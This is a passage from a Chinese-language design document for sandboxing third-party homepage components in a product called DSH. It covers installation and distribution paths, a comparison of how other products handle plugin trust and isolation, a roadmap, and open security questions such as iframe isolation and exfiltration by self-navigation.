| 原始 URL | 贴 GitHub raw / gist 链接（宿主代下载 + 哈希固定） | 开源作者 |
| 注册表 | 添加 registry URL → 浏览 → 点安装 | 社区 |
| 源码 | 粘贴整段 JS（「复制这段给 DSH」） | AI 对话流、论坛帖子 |

「粘贴源码」这条是 AI 时代的重要路径：用户让 ChatGPT/Claude 生成一个组件，复制回来，DSH 弹安装
提示。**但要防止粘贴到的是被聊天气泡截断/夹带的内容**——所以安装前永远显示 manifest 摘要 + 权限 +
哈希，而不是直接执行。

### 6.2 整页

- **布局 JSON**（L0）：轻、稳、默认脱敏。
- **主页包** `.dshhomepack.json`：布局 + 主题 + 引用的组件源码内联。一个文件还原整套首页；单个文件
  预计 < 200KB；导入时逐个组件走 L1 安装流程（权限照旧确认），不做「一键信任全部」。
- 背景图默认不进包（截图/隐私风险），要带必须显式勾选并压到合理尺寸。

### 6.3 团队 / 企业分发（v1.5 可选）

- 私有注册表 URL + 策略：只允许 `<company>-signed` 的组件；
- 预装组件包（管理员把 `.dshw.js` 放到 profile 目录，标记为「由管理员安装，不可移除」）；
- 审计导出（组件 → 权限 → 版本），给安全团队交差；
- 一键禁用所有第三方组件（保留内置部分）。

### 6.4 版本、卸载、回滚

- 版本用 semver；客户端按 `id + sha256` 缓存，旧版保留，可回滚；
- 卸载 = 删文件 + 删该组件的 `storage.self` 命名空间 + 从布局里留空位；
- 「更新全部」入口显示权限差异；**从不静默提权**。

---

## 7. 同类产品怎么做的

完整调研（含逐产品来源链接）见 `docs/research-comparable.md`。这里只留对决策有用的部分。

### 7.1 一张表

| 产品 | 载体 | 代码信任模型 | 权限 / 数据 | 分发与审核 | 典型失败模式 |
|---|---|---|---|---|---|
| **Grafana** | `plugin.json` + 前端 bundle（+ 可选 Go 后端） | 同页面执行；2025 起可选独立 JS realm（**默认关**） | 无细粒度权限；data frames 直接作为 React props 传入 | catalog + **签名分级**（Unsigned/Invalid 拒绝加载） | 签名只防篡改；同页面执行是历史债 |
| **Home Assistant / HACS** | 单个 JS 文件（custom element） | **无隔离，同页面** | 卡片拿到完整 `hass`，含用户 token、`callService` | HACS / 2026.11 起官方 Marketplace，**无安全审核** | 目录≠安全边界；恶意卡片可读全屋数据 |
| **Raycast** | npm 包 + React API | 每扩展独立 v8 isolate + 薄 RPC；**OS 层不沙箱** | 无细粒度权限；password preference 本地加密、仅本扩展可读 | 全源码开源 + 人工 review + CI；Store | 自动更新绕过初次审核 |
| **Obsidian** | 单 JS 文件 + manifest | **全信任**（官方承认无法可靠限制） | 继承宿主全部权限 | 社区目录 + 自动扫描 + 评分卡 + 默认 Restricted Mode | PhantomPulse：插件投递 RAT |
| **VS Code** | VSIX | 扩展独立进程，**全信任**；webview 是 iframe + `postMessage` | 无逐扩展权限；Workspace Trust 按来源分级 | Marketplace，低门槛 + 事后扫描 | GlassWorm：恶意扩展窃 token |
| **Figma** | manifest + `code.js` + 可选 `ui.html` | 主线程极简 JS sandbox（无 DOM/fetch）；UI 走 `figma.showUI` iframe | manifest `networkAccess.allowedDomains`（默认 none）+ 能力 permissions | Community 人工 review，重大更新重审 | 隔离较彻底，风险落在 iframe 内容 |
| **Chrome MV3** | CRX + manifest | 独立 origin；MV3 禁远程代码；`eval` 只允许在 sandboxed iframe | 声明式 permissions + 运行时 `optional_permissions`，安装时警告 | Web Store 人工+自动、定期复审、强制禁用 | The Great Suspender：所有权转移 + 自动更新 |
| **Übersicht / Scriptable** | 本机 JS/JSX 文件 | **无**（可执行 shell / 调原生 API） | 无 | 无商店、社区分享、自行替换 | 只适合自用，不适合大众生态 |
| **Notion / Indify** | 一个 URL（iframe 嵌入） | 浏览器同源隔离，但**对方可联网、可见访问者** | 无显式权限 | 粘贴 URL，无审核 | 最轻，但主题/交互弱 + 第三方可观测 |

读出来的规律：

1. **没有「既完全开放又安全」的银弹**。要么全信任、把成本押在发行端（签名/审核/默认受限），
   要么强隔离、把成本押在宿主 API 设计上（Grafana/Raycast/Obsidian 是前者，Figma/Chrome
   webview 是后者）。
2. **强隔离的骨架永远是「场景 API 与浏览器 API 分离 + 消息传递」**：Figma 主线程 + UI iframe、
   VS Code webview + `postMessage`、Chrome 把 `eval` 关进 sandboxed iframe。我们的 `ctx` + iframe
   桥就是同一形状。
3. **签名与审核解决「篡改、劣质」，不解决「作者变坏」**。真实事故的共性是「所有权转移 / 供应链
   投毒 + 自动更新」——所以更新通道、作者身份、版本锁定，比多一道审核更能降低风险。
4. **目录/市场不是安全边界**：HACS、Obsidian 目录、VS Code Marketplace 都只是分发器。安全边界
   只能建在运行时。

### 7.2 值得抄的三条

1. **抄 Figma 的「场景 API / 浏览器 API 分离」**：组件只拿宿主显式给的 `ctx`，不直接摸 DOM、
   不直接 `fetch`、不拿凭据。`render(ctx)`/`mount(root, ctx)` 已经是好起点，再把「读用量 / 开
   工作区 / 打开设置」收进 `ctx` 白名单。
2. **抄 Chrome 的「声明式权限 + 运行时授权 + 安装时警告」**：manifest `permissions` 一屏说清，
   首次使用再确认，升级加权限必须重新授权，用户随时能撤销。
3. **抄 Obsidian 的「默认安全模式 + 目录透明」**：第三次组件首次安装默认禁网络、只给纯渲染；
   组件列表展示来源/权限/更新时间/哈希，一键禁用与回滚。

### 7.3 最该避开的三个坑

1. **别同时做「全信任 + 自动更新 + 低门槛市场」**。VS Code 与 Chrome 的事故都是这个组合。
2. **别把签名当安全全部**。Grafana 的签名只证明「装的和审的是同一份」，其 panel 插件至今仍与
   主页面同 JS 上下文（2025 才补可选 realm，且默认关闭）——签名之外必须有能力白名单。
3. **别在同页面跑第三方代码，却对外宣称「组件安全」**。Obsidian 与 Home Assistant 的官方文档
   都承认无法可靠限制权限；如果要做，就把「全信任」写进 UI 和文档，而不是藏在营销词里。

一句话：**本方案默认选「隔离 + 最小能力 + 显式授权」，而不是「全信任 + 审核背书」。**

---

## 8. 落地路线（本仓库）

| 阶段 | 内容 | 验收（P0 已实测） |
|---|---|---|
| **P0（已完成）** | 原型 27 组件 + 契约；本文档；`sandbox-demo` PoC（沙箱 + 权限桥 + 攻击探针） | Chrome 156 实测：3 个 iframe 均 `origin=null` / `sandbox=allow-scripts` / CSP 生效；**越权探针 7/7 被拦**（真实 SecurityError / TypeError）；`usage.read` 授权后渲染 23%/9%/41%；hostErrors 与 consoleErrors 均空；交互 E2E 18/18 |
| **P1** | 插件客户端接入沙箱运行时：第三方组件 iframe 层、复用 `/usage` `/browser` `/state` 做经纪人、安装面板（文件/URL/粘贴）、权限授权与审计 | 装一个 L1 组件不重启；内置组件不受影响；越权请求被拒 |
| **P2** | 作者工具链：`init/dev/check/pack`（零依赖 Node）；布局导出/导入含组件依赖；主页包；设置页「组件」管理 | 新作者 10 分钟做出第一个组件并被另一个人装上 |
| **P3** | 静态注册表 + 官方精选 + 签名 + 撤回；企业策略 | 从目录安装到运行的完整链路，有审核口径 |

P1 的关键设计约束：**内置组件继续跑在页面里（它们是插件的一部分，受信），第三方组件跑沙箱**。
两套运行时共用同一份作者契约和同一份 `ctx` 形状，避免作者写两遍。代价是宿主侧多一点胶水，值得。

P1 之前先答的两个工程问题，第一个已在 §4.4 核实并给出结论（DSH 0.2.2-rc.1 没有 CSP，`srcdoc`
可用；但要为未来收紧留「宿主路由 + 响应头 CSP」的退路），第二个是**主题 token 如何注入 iframe**
（§9.2，建议由宿主统一注入，组件不依赖宿主 CSS 文件）。

---

## 9. 开放问题

1. **CSP 环境**：已核实 DSH 0.2.2-rc.1 主进程/本地 web server/前端入口都没有 CSP（见 §4.4），
   所以 `srcdoc` 内联脚本 + 自设 meta CSP 今天可用。但未来 DSH 若收紧 CSP，`srcdoc` 会继承父
   策略而失效——实现时把 iframe 文档来源做成可替换的（`srcdoc` → 宿主路由返回 HTML + 响应头
   CSP），并保留一条真机回归测试。
2. **主题同步**：iframe 里没有宿主 CSS。方案是宿主把 token 变量表 + 1KB 公共类注入 iframe 文档头，
   `theme` 变化时桥推 `{t:'theme'}` 重设变量。要不要让作者直接把 `base.css` 子集内联进组件？
   倾向后者（组件自包含，可离线预览），宿主只保证变量值一致。
3. **iframe 数量与性能**：20 个组件 = 20 个 iframe，内存/首帧会有代价。P1 先限制「最多 12 个沙箱
   组件」+ 不可见不挂载；真不够再考虑同源多 iframe 池化。
4. **`network` 权限**：v1 建议不提供，URL 组件覆盖在线需求。若后期要提供，必须是宿主代理（剥凭据、
   限速、日志、域名白名单），且安装时红色警示。
5. **注册表治理**：官方精选的审核标准（源码可读？不联网？截图合规？）、撤下流程、命名空间仲裁
   （`github:` 前缀已缓解撞名，不解决同名冒用）。
6. **无障碍与 i18n**：组件 `name` 目前单语言，若要跟随 DSH 语言，manifest 需要 `name: {zh, en}`；
   iframe 内的焦点顺序、屏幕阅读器标签需要宿主兜底。
7. **是否保留同页面信任通道**：内置组件在页面里能直接读 React 上下文（比如输入框组件的宽度联动）。
   第三方组件永远拿不到这条通道——这个不对称要在文档里讲明白，避免作者困惑。
8. **自导航外泄的工程缓解**：`navigate-to` 未实现，CSP 拦不住组件把自己导航到外部 URL。除了「少喂
   数据」，还能做什么？候选：宿主监听 `load` 次数（初次加载后再次 load = 疑似自导航，立即销毁）、
   在 chrome://process-internals 级看不到 URL 的前提下用 CDP 审计（桌面端可行、Web 端不可行）、
   或接受「数据即泄露上限」并把风险写进授权文案。P1 用第一种，验证误报率。
9. **Electron 运行时复核**：OOPIF 进程隔离、定时器节流阈值、`navigate-to` 缺位都是在本机 Chrome 156
   实测的；DSH 内置 Chromium 152 的表现要用同一套测试页在真机上复核（尤其 site isolation 是否关闭）。
10. **Web 模式**：桌面端已确认无 CSP，但 `http://127.0.0.1` 模式的响应头因鉴权未验证。若 Web 模式
    将来加 CSP，`srcdoc` 会继承，需切到宿主路由方案。

---

## 附：参考

- 组件契约原型：`docs/prototype/CONTRACT.md`
- 布局行为考据：`docs/prototype/LAYOUT-BEHAVIOR.md`
- 同类产品调研：`docs/research-comparable.md`
- 沙箱机制调研：`docs/research-sandbox-tech.md`
- 可运行 PoC：`docs/prototype/sandbox-demo/`
